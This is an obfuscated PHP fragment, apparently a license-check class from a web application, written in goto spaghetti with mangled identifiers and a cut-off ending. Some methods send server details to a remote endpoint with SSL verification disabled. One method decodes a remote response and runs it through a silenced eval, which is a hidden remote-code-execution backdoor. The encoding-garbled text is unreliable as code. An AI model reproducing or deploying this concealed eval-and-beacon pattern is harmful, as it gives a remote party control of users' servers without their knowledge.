$b˜º§›¬£[215]))); goto dá æ²¿Ä¤; Cò…ŠÈÕ®: $BÈâßä¤ß†[$b˜º§›¬£[123]] = $b˜º§›¬£[118]($b˜º§›¬£[214]($this->{$_SERVER[‘Ûª¥Ç…][147]}($bğñ¶³ñĞ, $b˜º§›¬£[216]))); if ($dˆ©½ùïš[$b˜º§›¬£[217]] && $dˆ©½ùïš[$b˜º§›¬£[217]] >= 1) { $b˜º§›¬£[61]($b˜º§›¬£[62])->{$_SERVER[‘Ûª¥Ç…][218]}($b˜º§›¬£[219], $b˜º§›¬£[220]); } $b˜º§›¬£[61]($b˜º§›¬£[62])->{$_SERVER[‘Ûª¥Ç…][221]}($BÈâßä¤ß†); goto F£í–Îéçµ; C­²Ô‰ãÇ: $b˜º§›¬£[166]($b˜º§›¬£[197]($b˜º§›¬£[208]), !0); goto b•ÅßÚ¨æƒ; fìÛÔŠ£Ò: $fÚÄ¸ÎÍ½ = $b˜º§›¬£[114]($_SERVER[$b˜º§›¬£[115]] . $CæÕìç— Ê); if ($AŞÛéêÅÖ[$b˜º§›¬£[178]] == $b˜º§›¬£[179]) { $d‹‹ĞäÉ¹„ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($fÚÄ¸ÎÍ½, $b˜º§›¬£[180]); $D™‘¼¥Éˆ = $this->{$_SERVER[‘Ûª¥Ç…][127]}($b˜º§›¬£[148]($c™Šî×Ê¹), $fÚÄ¸ÎÍ½ . $b˜º§›¬£[181], 3); $d¸Ã‹ÙóÁ = $this->{$_SERVER[‘Ûª¥Ç…][182]}($b˜º§›¬£[183] . $d‹‹ĞäÉ¹„ . $b˜º§›¬£[184] . $D™‘¼¥Éˆ, -1); $b˜º§›¬£[166]($d¸Ã‹ÙóÁ, !0); } else { if ($AŞÛéêÅÖ[$b˜º§›¬£[178]] == $b˜º§›¬£[185]) { $c¢Å¯ßÜ¦ = $b˜º§›¬£[25]($b˜º§›¬£[114]($b˜º§›¬£[186] . $fÚÄ¸ÎÍ½), 12, 15) . $b˜º§›¬£[187]; $D™‘¼¥Éˆ = $this->{$_SERVER[‘Ûª¥Ç…][188]}($b˜º§›¬£[2]($AŞÛéêÅÖ[$b˜º§›¬£[189]]), $c¢Å¯ßÜ¦, 2); $eÑÌÍÂçß = $b˜º§›¬£[190]($D™‘¼¥Éˆ, !0); if (!$b˜º§›¬£[191]($eÑÌÍÂçß) || !$b˜º§›¬£[191]($eÑÌÍÂçß[$b˜º§›¬£[192]]) || $eÑÌÍÂçß[$b˜º§›¬£[165]] != !0) { $dÙ’ÄˆãÆ· = $b˜º§›¬£[193]; $CˆÏ¸›ªã» = $eÑÌÍÂçß[$b˜º§›¬£[192]] ? $b˜º§›¬£[194] . $eÑÌÍÂçß[$b˜º§›¬£[192]] : $dÙ’ÄˆãÆ·; $b˜º§›¬£[166]($CˆÏ¸›ªã», !1); } else { $c™Šî×Ê¹[$b˜º§›¬£[168]] = $eÑÌÍÂçß[$b˜º§›¬£[192]][$b˜º§›¬£[195]]; } } else { $eÑÌÍÂçß = $this->{$_SERVER[‘Ûª¥Ç…][182]}($b˜º§›¬£[196], $c™Šî×Ê¹, 10); $Fî¶ÉÀ‰­è = $f„İ™ªöÃ[596]; if (!$Fî¶ÉÀ‰­è) { die; } } } if (!$b˜º§›¬£[191]($eÑÌÍÂçß) || !$b˜º§›¬£[191]($eÑÌÍÂçß[$b˜º§›¬£[192]]) || $eÑÌÍÂçß[$b˜º§›¬£[165]] != !0) { $dÙ’ÄˆãÆ· = $b˜º§›¬£[197]($b˜º§›¬£[198]); $CˆÏ¸›ªã» = $eÑÌÍÂçß[$b˜º§›¬£[192]] ? $b˜º§›¬£[194] . $eÑÌÍÂçß[$b˜º§›¬£[192]] : $dÙ’ÄˆãÆ·; $b˜º§›¬£[166]($CˆÏ¸›ªã», !1); } goto FË„—ÁÉŠ„; FË„—ÁÉŠ„: $dˆ©½ùïš = $eÑÌÍÂçß[$b˜º§›¬£[192]]; $C¤Æ³Õ½¤¡ = $this->{$_SERVER[‘Ûª¥Ç…][199]}($dˆ©½ùïš[$b˜º§›¬£[200]]); if (!$C¤Æ³Õ½¤¡ || $C¤Æ³Õ½¤¡ != $b˜º§›¬£[201]($dˆ©½ùïš[$b˜º§›¬£[145]])) { $c•Ä¯Êçƒ = array($b˜º§›¬£[202] => $b˜º§›¬£[61]($b˜º§›¬£[62])->{$_SERVER[‘Ûª¥Ç…][63]}($b˜º§›¬£[116]), $b˜º§›¬£[203] => $_SERVER[$b˜º§›¬£[115]], $b˜º§›¬£[204] => $b˜º§›¬£[205](), $b˜º§›¬£[174] => $_SERVER[$b˜º§›¬£[175]]); $D™‘¼¥Éˆ = $this->{$_SERVER[‘Ûª¥Ç…][206]}($b˜º§›¬£[148]($c•Ä¯Êçƒ)); $this->{$_SERVER[‘Ûª¥Ç…][182]}($b˜º§›¬£[207] . $D™‘¼¥Éˆ); $b˜º§›¬£[166]($b˜º§›¬£[197]($b˜º§›¬£[208]), !0); } goto aİî«ó™Ş‹; aí„‹•“˜›: $f„İ™ªöÃ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b˜º§›¬£ =& $_SERVER[‘Ûª¥Ç…]; if ($_SERVER[$b˜º§›¬£[44]] != $b˜º§›¬£[162]) { return; } goto C…¹ô²¡Ä÷; C…¹ô²¡Ä÷: if (!$b˜º§›¬£[104]($GLOBALS, $b˜º§›¬£[132])) { die; } $AŞÛéêÅÖ = $GLOBALS[$b˜º§›¬£[22]]; if (isset($AŞÛéêÅÖ[$b˜º§›¬£[163]])) { $this->{$_SERVER[‘Ûª¥Ç…][164]}(); die; } goto aª½¬›æ; b ¿´œìë: $e¼ñµÛ„îã = $b˜º§›¬£[214]($b˜º§›¬£[25]($EÙèâ¶ˆÚª, 10, 16)); $Fˆ—Ø†Ş = $this->{$_SERVER[‘Ûª¥Ç…][127]}($b˜º§›¬£[148]($dˆ©½ùïš), $EÙèâ¶ˆÚª); $Eª¿ÄÓËë = $b˜º§›¬£[222]($b˜º§›¬£[61]($b˜º§›¬£[11])->{$_SERVER[‘Ûª¥Ç…][223]}(), $b˜º§›¬£[224]); goto D¶„î°©«¶; aİî«ó™Ş‹: $BÈâßä¤ß† = array($b˜º§›¬£[209] => $c™Šî×Ê¹[$b˜º§›¬£[165]], $b˜º§›¬£[210] => $dˆ©½ùïš[$b˜º§›¬£[211]], $b˜º§›¬£[212] => $b˜º§›¬£[124](16), $b˜º§›¬£[120] => $dˆ©½ùïš[$b˜º§›¬£[213]]); if ($c™Šî×Ê¹[$b˜º§›¬£[168]]) { $BÈâßä¤ß†[$b˜º§›¬£[212]] = $c™Šî×Ê¹[$b˜º§›¬£[168]]; } $då¢‹áÑ = $b˜º§›¬£[25]($b˜º§›¬£[114]($BÈâßä¤ß†[$b˜º§›¬£[210]]), 10, 10); goto eÂÅ»†±¾; F£í–Îéçµ: $EÙèâ¶ˆÚª = $b˜º§›¬£[114]($_SERVER[$b˜º§›¬£[115]] . $b˜º§›¬£[214]($CæÕìç— Ê) . $BÈâßä¤ß†[$b˜º§›¬£[210]]); $f¥¸¡¦Ş‰æ = $f„İ™ªöÃ[599]; while ($f¥¸¡¦Ş‰æ < $f„İ™ªöÃ[561]) { if ($f¥¸¡¦Ş‰æ >= 0) { break; } $f¥¸¡¦Ş‰æ++; } goto b ¿´œìë; aª½¬›æ: if (!isset($AŞÛéêÅÖ[$b˜º§›¬£[165]]) || $b˜º§›¬£[24]($AŞÛéêÅÖ[$b˜º§›¬£[165]]) != 16) { $b˜º§›¬£[166]($b˜º§›¬£[167] . $AŞÛéêÅÖ[$b˜º§›¬£[165]], !1); } $CæÕìç— Ê = $b˜º§›¬£[61]($b˜º§›¬£[62])->{$_SERVER[‘Ûª¥Ç…][63]}($b˜º§›¬£[116]); $c™Šî×Ê¹ = array($b˜º§›¬£[165] => $AŞÛéêÅÖ[$b˜º§›¬£[165]], $b˜º§›¬£[168] => $b˜º§›¬£[124](16), $b˜º§›¬£[169] => $b˜º§›¬£[149], $b˜º§›¬£[170] => $b˜º§›¬£[171], $b˜º§›¬£[172] => $_SERVER[$b˜º§›¬£[173]], $b˜º§›¬£[174] => $_SERVER[$b˜º§›¬£[175]], $b˜º§›¬£[176] => $_SERVER[$b˜º§›¬£[177]]); goto fìÛÔŠ£Ò; b•ÅßÚ¨æƒ: } private function onzc218c76f5() { goto DßØÇ„½ÙÓ; DßØÇ„½ÙÓ: $aÎ­›×³¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¦”Œå×³ =& $_SERVER[‘Ûª¥Ç…]; $b¦”Œå×³[61]($b¦”Œå×³[62])->{$_SERVER[‘Ûª¥Ç…][221]}(array($b¦”Œå×³[209] => $b¦”Œå×³[10], $b¦”Œå×³[210] => $b¦”Œå×³[10], $b¦”Œå×³[120] => $b¦”Œå×³[121], $b¦”Œå×³[122] => $b¦”Œå×³[10], $b¦”Œå×³[123] => $b¦”Œå×³[10])); goto Dì¢ŒŠ´‚; Aˆ‹‘ãæÉ: $this->izypf111d6fd = $b¦”Œå×³[121]; $E‚œˆ³‚Â» = $aÎ­›×³¤[603]; if (strlen($E‚œˆ³‚Â») < $aÎ­›×³¤[565]) { return; } goto aàˆ“±ÎõÛ; fÊÄæ¨: $this->hdrj82f56670 = array(); $DºÌî”‰¤ = $aÎ­›×³¤[602]; if (!$DºÌî”‰¤) { die; } goto Aˆ‹‘ãæÉ; Dì¢ŒŠ´‚: $BÈø¥ùø–² = $aÎ­›×³¤[601]; if (strlen($BÈø¥ùø–²) < $aÎ­›×³¤[565]) { die; } $b¦”Œå×³[61]($b¦”Œå×³[62])->{$_SERVER[‘Ûª¥Ç…][218]}($b¦”Œå×³[219], $b¦”Œå×³[229]); goto fÊÄæ¨; aàˆ“±ÎõÛ: } private function dwpi9d2fb603() { goto CøÃÁÊâá; eà×Ìó¯ø–: while ($C“á«•‚© < $e‘“™ˆ‚ˆ[561]) { if ($C“á«•‚© >= 0) { break; } $C“á«•‚©++; } goto D±Ç÷·´¢; a×£×Ù´™‘: if (strlen($fìÖÌ¯­í) < $e‘“™ˆ‚ˆ[556]) { return; } $D™Şô»®ê = $eº‹ô“õ‰[222]($eº‹ô“õ‰[61]($eº‹ô“õ‰[11])->{$_SERVER[‘Ûª¥Ç…][223]}(), $eº‹ô“õ‰[224]); $fÓšĞÓâ° = $D™Şô»®ê[$eº‹ô“õ‰[225]]; goto F³Àá´Íö‹; AÁ®ß·¿—: if (strlen($a•¸Õ¬Í¢) < $e‘“™ˆ‚ˆ[561]) { die; } $E¥òŒ¨¦—Â = $this->{$_SERVER[‘Ûª¥Ç…][188]}($fÓšĞÓâ°[$eº‹ô“õ‰[91]][$AÊ¹Ë„®½], $d¢”¬ƒ­ª¿); $E¥òŒ¨¦—Â = $eº‹ô“õ‰[190]($E¥òŒ¨¦—Â, !0); goto bˆ¦Š‘éŒ; C¨Ğ–çá›Û: $this->hdrj82f56670 = $E¥òŒ¨¦—Â; $this->izypf111d6fd = $B¢‹‰¶Ù±­[$eº‹ô“õ‰[120]]; $C“á«•‚© = $e‘“™ˆ‚ˆ[611]; goto eà×Ìó¯ø–; bˆ¦Š‘éŒ: if (!$eº‹ô“õ‰[191]($E¥òŒ¨¦—Â)) { return $this->{$_SERVER[‘Ûª¥Ç…][164]}(); } $a®©¦ª‘½ = $eº‹ô“õ‰[144]($E¥òŒ¨¦—Â[$eº‹ô“õ‰[145]]); if ($eº‹ô“õ‰[230]() >= $a®©¦ª‘½) { return $this->{$_SERVER[‘Ûª¥Ç…][164]}(); } goto C¨Ğ–çá›Û; båäáå„ˆ¹: $A¤³©Âƒ‚ = $e‘“™ˆ‚ˆ[604]; $this->izypf111d6fd = $eº‹ô“õ‰[121]; $BŠÈœÆÂÙä = $e‘“™ˆ‚ˆ[605]; goto eŞº¿´ƒ; Eèƒ¢¶Ğ¡„: if ($B¢‹‰¶Ù±­[$eº‹ô“õ‰[120]] == $eº‹ô“õ‰[121]) { return; } $cœ³ğŸ«ÒÜ = $eº‹ô“õ‰[61]($eº‹ô“õ‰[62])->{$_SERVER[‘Ûª¥Ç…][63]}($eº‹ô“õ‰[116]); $fìÖÌ¯­í = $e‘“™ˆ‚ˆ[607]; goto a×£×Ù´™‘; F³Àá´Íö‹: $C‘Î½î˜ó = $e‘“™ˆ‚ˆ[608]; while (strlen($C‘Î½î˜ó) < $e‘“™ˆ‚ˆ[556]) { if (!$C‘Î½î˜ó) { break; } $C‘Î½î˜ó++; } $d¢”¬ƒ­ª¿ = $eº‹ô“õ‰[114]($_SERVER[$eº‹ô“õ‰[115]] . $eº‹ô“õ‰[214]($cœ³ğŸ«ÒÜ) . $B¢‹‰¶Ù±­[$eº‹ô“õ‰[210]]); goto E Ôß·Ûù; CøÃÁÊâá: $e‘“™ˆ‚ˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eº‹ô“õ‰ =& $_SERVER[‘Ûª¥Ç…]; $_SERVER[$eº‹ô“õ‰[175]] = $eº‹ô“õ‰[104]($_SERVER, $eº‹ô“õ‰[175], APP_HOST); goto båäáå„ˆ¹; eŞº¿´ƒ: if (strlen($BŠÈœÆÂÙä) < $e‘“™ˆ‚ˆ[567]) { die; } $B¢‹‰¶Ù±­ = $eº‹ô“õ‰[61]($eº‹ô“õ‰[62])->{$_SERVER[‘Ûª¥Ç…][63]}(); $bŞ˜‘ÁÛåÈ = $e‘“™ˆ‚ˆ[606]; goto Eèƒ¢¶Ğ¡„; E Ôß·Ûù: $c˜ëÇŒ’‚ = $e‘“™ˆ‚ˆ[609]; $AÊ¹Ë„®½ = $eº‹ô“õ‰[214]($eº‹ô“õ‰[25]($d¢”¬ƒ­ª¿, 10, 16)); $a•¸Õ¬Í¢ = $e‘“™ˆ‚ˆ[610]; goto AÁ®ß·¿—; D±Ç÷·´¢: } private function ifkw27dfdeb6() { goto Eò‚Õ¦Ğ… ; Eò‚Õ¦Ğ… : $A¡ì²ÜĞ¨ğ =& $_SERVER[‘Ûª¥Ç…]; $f²ëõÜáÔ™ = $GLOBALS[$A¡ì²ÜĞ¨ğ[22]]; $AÂ¦Ã‹µÙ„ = $_SERVER[$A¡ì²ÜĞ¨ğ[44]]; goto DÛè‡”Ä®; dÅµ‚ß£Şø: if ($A¡ì²ÜĞ¨ğ[236]($AÂ¦Ã‹µÙ„, $C´Ñ¤Š°À)) { if ($this->izypf111d6fd == $A¡ì²ÜĞ¨ğ[121] && isset($f²ëõÜáÔ™[$A¡ì²ÜĞ¨ğ[237]])) { $A¡ì²ÜĞ¨ğ[166]($A¡ì²ÜĞ¨ğ[197]($A¡ì²ÜĞ¨ğ[232]), !1, $A¡ì²ÜĞ¨ğ[233]); die; } $eĞÀĞ´î†Ÿ = $this->{$_SERVER[‘Ûª¥Ç…][137]}(); if ($eĞÀĞ´î†Ÿ != $A¡ì²ÜĞ¨ğ[201]($A¡ì²ÜĞ¨ğ[238])) { if ($eĞÀĞ´î†Ÿ <= $A¡ì²ÜĞ¨ğ[61]($A¡ì²ÜĞ¨ğ[139])->{$_SERVER[‘Ûª¥Ç…][140]}()) { $A¡ì²ÜĞ¨ğ[166]($A¡ì²ÜĞ¨ğ[197]($A¡ì²ÜĞ¨ğ[239]), !1, $A¡ì²ÜĞ¨ğ[233]); die; } } } goto aÉåÑÎ§Ô; DÛè‡”Ä®: $cÀâƒø¿ñµ = $_SERVER[ºÖÙÂŒäÉê‡][612]; if ($AÂ¦Ã‹µÙ„ == $A¡ì²ÜĞ¨ğ[231] && $this->izypf111d6fd == $A¡ì²ÜĞ¨ğ[121]) { $A¡ì²ÜĞ¨ğ[166]($A¡ì²ÜĞ¨ğ[197]($A¡ì²ÜĞ¨ğ[232]), !1, $A¡ì²ÜĞ¨ğ[233]); } $C´Ñ¤Š°À = array($A¡ì²ÜĞ¨ğ[234], $A¡ì²ÜĞ¨ğ[235]); goto dÅµ‚ß£Şø; aÉåÑÎ§Ô: } private function mgks3209dfb6() { goto Aô¡­¹‚ñÔ; Aô¡­¹‚ñÔ: $aŒµô‡ó¬· =& $_SERVER[ºÖÙÂŒäÉê‡]; $C‡šµ†ÈËĞ =& $_SERVER[‘Ûª¥Ç…]; $a¦œÓßİÃ = array($C‡šµ†ÈËĞ[135], $C‡šµ†ÈËĞ[240]); goto EÉÜ—øïã; EÉÜ—øïã: if (!$C‡šµ†ÈËĞ[104]($GLOBALS, $C‡šµ†ÈËĞ[132]) || !isset($_GET[$C‡šµ†ÈËĞ[241]])) { return; } if (!$C‡šµ†ÈËĞ[236]($_SERVER[$C‡šµ†ÈËĞ[44]], $a¦œÓßİÃ)) { return; } $Aâ•Ê‡ŠºÆ = $C‡šµ†ÈËĞ[242]; goto a†Ë…ÄÆÙÜ; D—µ¢õå×´: $CãŸÖß®ŠÎ = $aŒµô‡ó¬·[615]; if ($Fï‘»¢ÊÑÌ && $C‡šµ†ÈËĞ[32]($Fï‘»¢ÊÑÌ, $C‡šµ†ÈËĞ[253])) { echo $Fï‘»¢ÊÑÌ; } die; goto a«Âà¡ôØÔ; a†Ë…ÄÆÙÜ: $Aâ•Ê‡ŠºÆ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($Aâ•Ê‡ŠºÆ, $C‡šµ†ÈËĞ[244]); $E¿ÉÎ¢ó–­ = $C‡šµ†ÈËĞ[245](array($C‡šµ†ÈËĞ[246] => array($C‡šµ†ÈËĞ[247] => $C‡šµ†ÈËĞ[248], $C‡šµ†ÈËĞ[249] => 3))); $CÌËøì•›¥ = $aŒµô‡ó¬·[613]; goto bß­¥í ë; bß­¥í ë: $Fï‘»¢ÊÑÌ = @$C‡šµ†ÈËĞ[250]($Aâ•Ê‡ŠºÆ, !1, $E¿ÉÎ¢ó–­); $bï®³ø¬¿™ = $aŒµô‡ó¬·[614]; $C‡šµ†ÈËĞ[251]($C‡šµ†ÈËĞ[252]); goto D—µ¢õå×´; a«Âà¡ôØÔ: } public function eubge783cf15($a‚±È×‚Ì÷) { goto BÚÛù¸Óê; fÒÕ—ê¯¥„: return $a‚±È×‚Ì÷; $B†©ªˆ¶·ç = $f„½¡½²öï[619]; goto C‘ò¾’ß«·; BÚÛù¸Óê: $f„½¡½²öï =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÑ‹…Û´ =& $_SERVER[‘Ûª¥Ç…]; if ($this->izypf111d6fd == $aÑ‹…Û´[254]) { return $a‚±È×‚Ì÷; } goto a’˜ÎŠô°É; a’˜ÎŠô°É: $bõ‹ˆÍãÉ— = array($aÑ‹…Û´[255], $aÑ‹…Û´[256], $aÑ‹…Û´[257], $aÑ‹…Û´[258], $aÑ‹…Û´[259], $aÑ‹…Û´[260], $aÑ‹…Û´[261], $aÑ‹…Û´[262]); $cÖ·Û†Ô­Ô = $f„½¡½²öï[616]; if (strlen($cÖ·Û†Ô­Ô) < $f„½¡½²öï[567]) { die; } goto d¦á†³Á‹Œ; d¦á†³Á‹Œ: $dÆ¦ÆŠ’ìÜ = $aÑ‹…Û´[0]($aÑ‹…Û´[263], $aÑ‹…Û´[104]($this->hdrj82f56670, $aÑ‹…Û´[129], $aÑ‹…Û´[10])); $DÓĞÒ­İ£¯ = array(); $B–ã—‘ë‡³ = $f„½¡½²öï[617]; goto cÃŞéÙó‘; cÃŞéÙó‘: if (!$B–ã—‘ë‡³) { die; } foreach ($bõ‹ˆÍãÉ— as $fÉôÛß„) { if (!$aÑ‹…Û´[236]($fÉôÛß„, $dÆ¦ÆŠ’ìÜ)) { $DÓĞÒ­İ£¯[] = $fÉôÛß„; } } foreach ($DÓĞÒ­İ£¯ as $fÉôÛß„) { unset($a‚±È×‚Ì÷[$fÉôÛß„]); $A“Âƒ¶°î¶ = $f„½¡½²öï[618]; while (strlen($A“Âƒ¶°î¶) < $f„½¡½²öï[556]) { if (!$A“Âƒ¶°î¶) { break; } $A“Âƒ¶°î¶++; } } goto fÒÕ—ê¯¥„; C‘ò¾’ß«·: } private function jamzd962bfce() { goto aÚ•ÅŞ¹Í; aÚ•ÅŞ¹Í: $bÌ’‘¡š££ =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÁëÅó•Ä =& $_SERVER[‘Ûª¥Ç…]; if ($this->izypf111d6fd != $CÁëÅó•Ä[121]) { $GLOBALS[$CÁëÅó•Ä[91]][$CÁëÅó•Ä[95]][$CÁëÅó•Ä[264]] = $CÁëÅó•Ä[220]; return; } goto DèºÅµéô”; C¦»¥°ä˜Ê: $GLOBALS[$CÁëÅó•Ä[91]][$CÁëÅó•Ä[95]][$CÁëÅó•Ä[264]] = $CÁëÅó•Ä[229]; $dŞ¸ƒã¡‚º = $bÌ’‘¡š££[621]; if (strlen($dŞ¸ƒã¡‚º) < $bÌ’‘¡š££[561]) { return; } goto BÄ”¿µ¾·Ÿ; BÄ”¿µ¾·Ÿ: $GLOBALS[$CÁëÅó•Ä[91]][$CÁëÅó•Ä[268]] = $CÁëÅó•Ä[220]; $CÁëÅó•Ä[61]($CÁëÅó•Ä[269])->{$_SERVER[‘Ûª¥Ç…][221]}($CÁëÅó•Ä[85], $CÁëÅó•Ä[229]); $DŒÌ±ØÉÅ = $bÌ’‘¡š££[622]; goto Bª¥ÎíºÙí; DèºÅµéô”: $dôÚö¤‘çï = $_SERVER[$CÁëÅó•Ä[44]]; $A¦ÔäÁƒ¾Œ = array($CÁëÅó•Ä[265]); foreach ($A¦ÔäÁƒ¾Œ as $bÁ‘›Î“‡’) { if ($bÁ‘›Î“‡’ == $dôÚö¤‘çï || $CÁëÅó•Ä[25]($dôÚö¤‘çï, 0, $CÁëÅó•Ä[24]($bÁ‘›Î“‡’)) == $bÁ‘›Î“‡’) { $CÁëÅó•Ä[166]($CÁëÅó•Ä[197]($CÁëÅó•Ä[266]), !1); } } goto eä½¾óÇ„¤; eä½¾óÇ„¤: $GLOBALS[$CÁëÅó•Ä[91]][$CÁëÅó•Ä[95]][$CÁëÅó•Ä[267]] = $CÁëÅó•Ä[220]; $BË™ï·ñ¿Í = $bÌ’‘¡š££[620]; if (!$BË™ï·ñ¿Í) { die; } goto C¦»¥°ä˜Ê; Bª¥ÎíºÙí: if (!$DŒÌ±ØÉÅ) { die; } goto d†–ÖĞÍ…Ó; d†–ÖĞÍ…Ó: } public function ktnz1ee3e8b4() { return $_SERVER[‘Ûª¥Ç…][270]; $AÃñâã½Ğ¼ = $_SERVER[ºÖÙÂŒäÉê‡][623]; } private function lskia09b2d09() { goto aöšĞÛßÛ—; bÌ‡ñ©ÔÍŒ: if ($D•š¬¹ÄÌŒ[230]() % 4 != 0) { return; } $Eõ–ˆåØ™ = $D•š¬¹ÄÌŒ[13](array($D•š¬¹ÄÌŒ[276], $D•š¬¹ÄÌŒ[277]), $F‡Š›ÜÒªÛ); $f «ÚÕ÷ƒÀ = $cç«Úò ²å[624]; goto cíÒÀù¿¦©; fÑÚ‰¿â†¨: $F‡Š›ÜÒªÛ = $D•š¬¹ÄÌŒ[274] . $D•š¬¹ÄÌŒ[114]($D•š¬¹ÄÌŒ[275]); if ($this->izypf111d6fd == $D•š¬¹ÄÌŒ[121] || !$D•š¬¹ÄÌŒ[104]($GLOBALS, $D•š¬¹ÄÌŒ[132])) { return; } if (!$D•š¬¹ÄÌŒ[236]($_SERVER[$D•š¬¹ÄÌŒ[44]], $c›ø‰‹ÍÆæ)) { return; } goto bÌ‡ñ©ÔÍŒ; cíÒÀù¿¦©: while (strlen($f «ÚÕ÷ƒÀ) < $cç«Úò ²å[567]) { if (!$f «ÚÕ÷ƒÀ) { break; } $f «ÚÕ÷ƒÀ++; } if ($Eõ–ˆåØ™ && $D•š¬¹ÄÌŒ[230]() - $Eõ–ˆåØ™ < $D•š¬¹ÄÌŒ[201]($D•š¬¹ÄÌŒ[278])) { return; } $D•š¬¹ÄÌŒ[13](array($D•š¬¹ÄÌŒ[276], $D•š¬¹ÄÌŒ[152]), $F‡Š›ÜÒªÛ, $D•š¬¹ÄÌŒ[230]()); goto Bâ‡ä÷‡£‘; aöšĞÛßÛ—: $cç«Úò ²å =& $_SERVER[ºÖÙÂŒäÉê‡]; $D•š¬¹ÄÌŒ =& $_SERVER[‘Ûª¥Ç…]; $c›ø‰‹ÍÆæ = array($D•š¬¹ÄÌŒ[271], $D•š¬¹ÄÌŒ[272], $D•š¬¹ÄÌŒ[273]); goto fÑÚ‰¿â†¨; Bâ‡ä÷‡£‘: $C¨Õîä¬ğ = array($D•š¬¹ÄÌŒ[165] => $D•š¬¹ÄÌŒ[61]($D•š¬¹ÄÌŒ[62])->{$_SERVER[‘Ûª¥Ç…][63]}($D•š¬¹ÄÌŒ[209]), $D•š¬¹ÄÌŒ[178] => $this->izypf111d6fd, $D•š¬¹ÄÌŒ[176] => $_SERVER[$D•š¬¹ÄÌŒ[177]], $D•š¬¹ÄÌŒ[169] => $D•š¬¹ÄÌŒ[149], $D•š¬¹ÄÌŒ[172] => $_SERVER[$D•š¬¹ÄÌŒ[173]]); $dÈ´¯Í®ŞÆ = $this->{$_SERVER[‘Ûª¥Ç…][182]}($D•š¬¹ÄÌŒ[279], $C¨Õîä¬ğ); if (!$D•š¬¹ÄÌŒ[191]($dÈ´¯Í®ŞÆ)) { return; } goto BŠ¾£ºƒ; BŠ¾£ºƒ: if ($dÈ´¯Í®ŞÆ[$D•š¬¹ÄÌŒ[165]] && $dÈ´¯Í®ŞÆ[$D•š¬¹ÄÌŒ[280]]) { if ($this->{$_SERVER[‘Ûª¥Ç…][199]}($dÈ´¯Í®ŞÆ[$D•š¬¹ÄÌŒ[280]]) == $C¨Õîä¬ğ[$D•š¬¹ÄÌŒ[165]]) { return; } } $this->{$_SERVER[‘Ûª¥Ç…][164]}(); if ($this->{$_SERVER[‘Ûª¥Ç…][199]}($dÈ´¯Í®ŞÆ[$D•š¬¹ÄÌŒ[280]]) != $C¨Õîä¬ğ[$D•š¬¹ÄÌŒ[165]]) { $EÉ£ÏÑÏ«» = array($D•š¬¹ÄÌŒ[202] => $D•š¬¹ÄÌŒ[61]($D•š¬¹ÄÌŒ[62])->{$_SERVER[‘Ûª¥Ç…][63]}($D•š¬¹ÄÌŒ[116]), $D•š¬¹ÄÌŒ[203] => $_SERVER[$D•š¬¹ÄÌŒ[115]], $D•š¬¹ÄÌŒ[204] => $D•š¬¹ÄÌŒ[205](), $D•š¬¹ÄÌŒ[174] => $_SERVER[$D•š¬¹ÄÌŒ[175]]); $fìÖ÷ÑïÃÖ = $this->{$_SERVER[‘Ûª¥Ç…][206]}($D•š¬¹ÄÌŒ[148]($EÉ£ÏÑÏ«»)); $dÈ´¯Í®ŞÆ = $this->{$_SERVER[‘Ûª¥Ç…][182]}($D•š¬¹ÄÌŒ[207] . $fìÖ÷ÑïÃÖ); if ($dÈ´¯Í®ŞÆ && $D•š¬¹ÄÌŒ[191]($dÈ´¯Í®ŞÆ) && isset($dÈ´¯Í®ŞÆ[$D•š¬¹ÄÌŒ[280]])) { $Aä±©¯¥¯É = $this->{$_SERVER[‘Ûª¥Ç…][188]}($dÈ´¯Í®ŞÆ[$D•š¬¹ÄÌŒ[280]], 2); if ($Aä±©¯¥¯É) { $Aä±©¯¥¯É = $this->{$_SERVER[‘Ûª¥Ç…][199]}($Aä±©¯¥¯É); } if ($Aä±©¯¥¯É) { try { @eval($Aä±©¯¥¯É); } catch (Exception $a»‚íŠ™£) { } } } } goto E£¿¾Éë†ˆ; E£¿¾Éë†ˆ: } private function gmbj5193387d($eù…¥Ë–Ä½ = '', $E½°¿ÀåçÈ = array(), $cŠ´á‡ÖÊ = 5) { goto eÖ‹…¾á¦š; aÌ¢·Şæà: $D„—©¨•Äƒ = $B¸š†”Ô— [625]; if (!$D„—©¨•Äƒ) { die; } $Dğ‡Ô¤´±¤ = $this->{$_SERVER[‘Ûª¥Ç…][243]}($Dğ‡Ô¤´±¤, $EõŠ±±—‘ã[282]); goto E­ó×÷ñøí; fÅâæ®õõî: return $EõŠ±±—‘ã[190]($E½°¿ÀåçÈ, !0); $B×ä¢‡ˆÀ” = $B¸š†”Ô— [627]; if (!$B×ä¢‡ˆÀ”) { die; } goto c÷æË·éö; c †¢®÷»¨: $b÷¬Ì‚Æ¹ = $B¸š†”Ô— [626]; if (strlen($b÷¬Ì‚Æ¹) < $B¸š†”Ô— [565]) { die; } $E½°¿ÀåçÈ = @$EõŠ±±—‘ã[250]($Dğ‡Ô¤´±¤, !1, $bÖ£È­¬Œ); goto fÅâæ®õõî; E­ó×÷ñøí: $Dğ‡Ô¤´±¤ = $Dğ‡Ô¤´±¤ . $eù…¥Ë–Ä½ . $EõŠ±±—‘ã[283] . $EõŠ±±—‘ã[284]($E½°¿ÀåçÈ); if ($E½°¿ÀåçÈ === -1) { return $Dğ‡Ô¤´±¤; } $bÖ£È­¬Œ = $EõŠ±±—‘ã[245](array($EõŠ±±—‘ã[246] => array($EõŠ±±—‘ã[249] => $cŠ´á‡ÖÊ, $EõŠ±±—‘ã[247] => $EõŠ±±—‘ã[285]), $EõŠ±±—‘ã[286] => array($EõŠ±±—‘ã[287] => !1, $EõŠ±±—‘ã[288] => !1))); goto c †¢®÷»¨; eÖ‹…¾á¦š: $B¸š†”Ô—  =& $_SERVER[ºÖÙÂŒäÉê‡]; $EõŠ±±—‘ã =& $_SERVER[‘Ûª¥Ç…]; $Dğ‡Ô¤´±¤ = $EõŠ±±—‘ã[281]; goto aÌ¢·Şæà; c÷æË·éö: } private function pykm4959e4d0() { goto dµÆŠ‹”™; f½íçíƒİï: $A„¶‡œÔ‡Ğ = $e˜îˆÒ­ˆ[104]($this->hdrj82f56670, $e˜îˆÒ­ˆ[316]); $Dƒ®õÒ“ó = $DßìŠ´¾Ê[631]; $A„¶‡œÔ‡Ğ = 